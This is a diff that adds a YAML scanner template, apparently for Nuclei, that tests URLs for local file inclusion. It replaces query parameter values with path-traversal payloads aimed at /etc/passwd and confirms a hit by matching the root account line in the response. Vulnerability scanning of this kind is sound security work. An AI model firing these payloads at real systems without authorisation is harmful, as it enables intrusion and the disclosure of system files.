@@ -1,0 +1,28 @@
+id: nawab-confirmed-lfi
+
+info:
+  name: 📂 Nawab-Confirmed-LFI 📂
+  author: thenawabx
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      lfi_payloads:
+        - "../../../../../etc/passwd"
+        - "/etc/passwd"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{lfi_payloads}}"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:x:0:0:[^:]+:[^:]+:[^:]+" # Full match for passwd line
+        part: body
